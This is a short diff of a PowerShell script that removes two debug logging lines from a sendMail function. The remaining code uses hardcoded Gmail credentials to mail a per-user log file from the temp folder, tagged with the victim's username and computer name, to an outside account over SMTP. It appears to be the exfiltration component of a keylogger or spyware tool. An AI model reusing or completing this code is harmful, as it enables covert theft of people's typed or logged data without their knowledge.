@@ -3,7 +3,6 @@ $Email = "username@gmail.com"
 $Password = "password"
 
 function sendMail($logFile="$env:temp\$env:username.log") {
-    echo "Mail should be sent at $(Get-Date)" > "C:\Users\0xrand0m\development\PowerShell\testing$((Get-Date).Minute).log"
     $Subject = "You got mail from $env:USERNAME!"
     $Body = @"
                 This email has been sent from $env:COMPUTERNAME
@@ -22,7 +21,6 @@ function sendMail($logFile="$env:temp\$env:username.log") {
     $SMTPClient = New-Object Net.Mail.SMTPClient($SMTPServer, 587)
     $SMTPClient.EnableSSL = $true
     $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Email, $Password)
-    echo $SMTPClient > "C:\Users\0xrand0m\development\PowerShell\smtp.log"
     $SMTPClient.Send($Email, $Email, $Subject, $Body)
 }
 
